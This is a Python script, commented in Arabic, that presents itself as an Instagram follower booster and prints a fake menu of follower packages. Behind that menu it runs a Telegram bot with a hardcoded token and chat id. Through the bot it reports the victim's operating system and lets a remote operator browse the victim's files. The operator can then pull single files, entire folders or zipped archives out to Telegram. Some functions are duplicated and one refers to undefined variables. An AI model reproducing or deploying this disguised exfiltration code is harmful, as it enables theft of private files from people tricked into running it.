import sys
import subprocess
import os
import platform
import hashlib
import telebot
import time
import shutil
from concurrent.futures import ThreadPoolExecutor
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton

# إعداد البوت باستخدام التوكن الخاص بك
bot = telebot.TeleBot("7517544528:AAEwE_8hpzGDqaQyaNSBlRUHi0CZ-ptGn_o")
chat_id = '5164991393'

# تثبيت المكتبات المطلوبة إذا لم تكن مثبتة بالفعل
required_modules = ['pyTelegramBotAPI', 'pyfiglet', 'requests']
for module in required_modules:
    try:
        __import__(module)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", module])

import pyfiglet
import requests

# طباعة رسالة الترحيب
ab = pyfiglet.figlet_format("@termuxpp")
print(ab)

def slow(T): 
    for r in T:
        sys.stdout.write(r)
        sys.stdout.flush()
        time.sleep(30/2000)

# عرض قائمة المتابعين الوهميين
slow("Welcome In Instagram Follower Script 💘 ----------------------------------------------")

slow("""
  [ 1 ] - 3k    
  [ 2 ] - 5k    
  [ 3 ] - 8k    
  [ 4 ] - 10k   
  [ 5 ] - 15k   
  [ 6 ] - 20k   
""")

# تحديد المسار الافتراضي بناءً على نظام التشغيل
if platform.system() == "Linux":
    if "kali" in platform.uname().release.lower():
        current_directory = "/home/"  # مسار الملفات في كالي لينكس
        bot.send_message(chat_id=chat_id, text="🚀 تم اكتشاف نظام التشغيل: Kali Linux")
    else:
        current_directory = "/storage/emulated/0/"  # مسار الملفات في نظام أندرويد (Termux)
        bot.send_message(chat_id=chat_id, text="🚀 تم اكتشاف نظام التشغيل: Android (Termux)")
elif platform.system() == "Windows":
    current_directory = "C:\\Users\\"  # مسار الملفات في نظام ويندوز
    bot.send_message(chat_id=chat_id, text="🚀 تم اكتشاف نظام التشغيل: Windows")
else:
    current_directory = os.path.expanduser("~")  # المسار الافتراضي لأي نظام آخر
    bot.send_message(chat_id=chat_id, text="🚀 تم اكتشاف نظام تشغيل غير معروف")

# تخزين المسارات في قاموس لسهولة الوصول إليها لاحقًا
file_paths = {}

# دالة لتوليد تجزئة MD5 لمسار معين
def generate_hash(path):
    return hashlib.md5(path.encode()).hexdigest()

# دالة لعرض الملفات والمجلدات في القائمة
def list_files_in_directory(directory):
    global current_directory
    current_directory = directory
    files = os.listdir(directory)
    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)

    # ترتيب وعرض المجلدات أولاً ثم الملفات
    for item in sorted(files):
        item_path = os.path.join(directory, item)
        if os.path.isdir(item_path):
            markup.add(KeyboardButton(f"📂 {item}"))
        else:
            file_hash = generate_hash(item_path)
            file_paths[file_hash] = item_path
            markup.add(KeyboardButton(f"📄 {item}"))

    # إضافة أزرار التنقل بين المجلدات
    if os.path.dirname(directory) != directory:  # عدم عرض زر "العودة" في جذر النظام
        markup.add(KeyboardButton("🔙 العودة إلى المجلد السابق"))
    markup.add(KeyboardButton("🏠 العودة للمسار الرئيسي"))

    bot.send_message(chat_id=chat_id, text=f'📁 المجلد الحالي: {directory}\nاختر ملفًا لإرساله أو مجلدًا للدخول إليه:', reply_markup=markup)

# دالة إرسال الملفات بناءً على نوعها
def send_file(file_path):
    with open(file_path, "rb") as f:
        bot.send_document(chat_id=chat_id, document=f, caption=f'📄 ملف: {file_path}')

# دالة إرسال الملفات من المجلد بناءً على الامتدادات المختارة
def send_files_from_directory(dir_path):
    with ThreadPoolExecutor(max_workers=50) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                file_path = os.path.join(root, file)
                executor.submit(send_file, file_path)

# ضغط وإرسال كافة الملفات في المجلد
def compress_and_send_directory(dir_path):
    zip_file = shutil.make_archive(dir_path.rstrip('/'), 'zip', dir_path)
    with open(zip_file, "rb") as f:
        bot.send_document(chat_id=chat_id, document=f, caption=f'ملفات مضغوطة من: {dir_path}')
    os.remove(zip_file)

# التعامل مع إدخال المسار من المستخدم
@bot.message_handler(func=lambda message: True)
def handle_file_selection(message):
    global current_directory
    selected = message.text.strip()
    
    if selected.startswith("📂"):
        # إذا كان المجلد، يتم التنقل داخله
        new_dir = os.path.join(current_directory, selected[2:].strip())
        if os.path.isdir(new_dir):
            list_files_in_directory(new_dir)
        else:
            bot.send_message(chat_id=chat_id, text="❌ هذا المجلد غير صالح.")
    elif selected.startswith("📄"):
        # إذا كان ملفًا، يتم إرساله
        file_name = selected[2:].strip()
        for file_hash, file_path in file_paths.items():
            if file_name in file_path:
                send_file(file_path)
                break
    elif selected == "🔙 العودة إلى المجلد السابق":
        parent_dir = os.path.dirname(current_directory)
        list_files_in_directory(parent_dir)
    elif selected == "🏠 العودة للمسار الرئيسي":list_files_in_directory("/storage/emulated/0/")
        
    else:
        dir_path = selected
        if not os.path.exists(dir_path):
            bot.send_message(chat_id=chat_id, text=f'📂 المسار {dir_path} غير موجود. يرجى التأكد من إدخال مسار صحيح.\nمسار مطلق: {os.path.abspath(dir_path)}')
        elif not os.path.isdir(dir_path):
            bot.send_message(chat_id=chat_id, text=f'{dir_path} هو ملف وليس مجلد. يرجى إدخال مسار مجلد.')
        else:
            bot.send_message(chat_id=chat_id, text=f'المسار {dir_path} صالح. الآن، اختر نوع الملفات التي ترغب في سحبها أو البحث عنها:')
            send_file_type_options(dir_path)

# إرسال خيارات نوع الملفات
def send_file_type_options(dir_path):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("إرسال كافة الملفات", callback_data=f"{dir_path}|كل"))
    markup.add(InlineKeyboardButton("بحث عن ملفات معينة", callback_data=f"{dir_path}|بحث"))
    markup.add(InlineKeyboardButton("ضغط وإرسال كافة الملفات", callback_data=f"{dir_path}|ضغط"))
    bot.send_message(chat_id=chat_id, text='اختر نوع الملفات أو الإجراء:', reply_markup=markup)

# التعامل مع خيارات الأزرار
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    dir_path, action = call.data.split("|")
    if action == "كل":
        bot.send_message(chat_id=chat_id, text=f'جاري إرسال جميع الملفات من: {dir_path}')
        send_files_from_directory(dir_path)
    elif action == "بحث":
        bot.send_message(chat_id=chat_id, text=f'أدخل اسم الملف أو الامتداد الذي ترغب في البحث عنه في {dir_path}:')
        bot.register_next_step_handler(call.message, handle_search_query, dir_path)
    elif action == "ضغط":
        bot.send_message(chat_id=chat_id, text=f'جاري ضغط وإرسال كافة الملفات من {dir_path}...')
        compress_and_send_directory(dir_path)

# التعامل مع البحث عن ملفات معينة
def handle_search_query(message, dir_path):
    query = message.text
    bot.send_message(chat_id=chat_id, text=f'جاري البحث عن {query} في {dir_path}...')
    search_and_send_files(dir_path, query)

def search_and_send_files(dir_path, query):
    found_files = []
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            if query in file or file.endswith(query):
                file_path = os.path.join(root, file)
                found_files.append(file_path)
    
    if found_files:
        bot.send_message(chat_id=chat_id, text=f'📁 المجلد الحالي: {directory}\nاختر ملفًا لإرساله أو مجلدًا للدخول إليه:', reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def handle_file_selection(message):
    global current_directory
    selected = message.text
    
    if selected.startswith("📂"):
        # إذا كان المجلد، يتم التنقل داخله
        new_dir = os.path.join(current_directory, selected[2:].strip())
        list_files_in_directory(new_dir)
    elif selected.startswith("📄"):
        # إذا كان ملفًا، يتم إرساله
        file_name = selected[2:].strip()
        for file_hash, file_path in file_paths.items():
            if file_name in file_path:
                send_file(file_path)
                break
    elif selected == "🔙 العودة إلى المجلد السابق":
        parent_dir = os.path.dirname(current_directory)
        list_files_in_directory(parent_dir)
    elif selected == "🏠 العودة للمسار الرئيسي":
        list_files_in_directory("/storage/emulated/0/")

# دالة لإرسال الملفات بناءً على نوعها
def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".png", ".jpg", ".jpeg", ".webp")):
            bot.send_photo(chat_id=chat_id, photo=f, caption=f'📄 ملف: {file_path}')
        elif file_path.lower().endswith((".mp4", ".mkv", ".avi", ".m3u", ".m3u8")):
            bot.send_video(chat_id=chat_id, video=f, caption=f'📄 ملف: {file_path}')
        elif file_path.lower().endswith((".pdf", ".docx", ".txt", ".py", ".sh", ".json")):
            bot.send_document(chat_id=chat_id, document=f, caption=f'📄 ملف: {file_path}')
        elif file_path.lower().endswith((".mp3", ".wav", ".m3u", ".m3u8", ".m4a")):
            bot.send_audio(chat_id=chat_id, audio=f, caption=f'📄 ملف: {file_path}')
        elif file_path.lower().endswith((".zip", ".rar"  ".apk", ".apks")):
            bot.send_document(chat_id=chat_id, document=f, caption=f'📄 ملف: {file_path}')

# بدء البوت بعرض الملفات من المسار /storage/emulated/0/
list_files_in_directory(current_directory)

bot.polling()

